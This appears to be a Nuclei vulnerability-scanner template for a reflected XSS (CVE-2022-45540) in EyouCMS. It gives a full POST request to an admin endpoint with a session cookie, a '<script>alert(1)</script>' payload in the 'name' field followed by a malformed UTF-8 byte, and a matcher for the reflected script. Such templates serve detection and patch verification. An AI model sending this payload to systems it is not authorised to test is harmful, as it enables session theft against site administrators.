id: CVE-2022-45540

info:
  name: Reflected XSS in EyouCMS <= 1.6.0
  author: ProjectDiscoveryAI
  severity: medium
  description: Reflected XSS vulnerability in EyouCMS <= 1.6.0 due to malformed UTF-8 characters in the "name" parameter.
  impact: |
    Successful exploitation could lead to unauthorized access, data theft, and account takeover.
  remediation: |
    Upgrade EyouCMS to version 1.6.1 or later to mitigate the Reflected XSS vulnerability.
  reference:
    - https://github.com/weng-xianhu/eyoucms/issues/37

http:
  - method: POST
    path:
      - "{{BaseURL}}/cms/eyoucms/login.php?m=admin&c=Field&a=arctype_add&_ajax=1&lang=cn"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
      Referer: "{{BaseURL}}/cms/eyoucms/login.php?m=admin&c=Field&a=arctype_add&lang=cn"
      X-Requested-With: XMLHttpRequest
      Accept: application/json, text/javascript, */*; q=0.01
      Origin: "{{BaseURL}}"
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
      Cookie: PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn

    body: |
      channel_id=-99&remark=af&dfvalue=&dtype=text&name=<script>alert(1)</script>%C0aef&title=aef
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
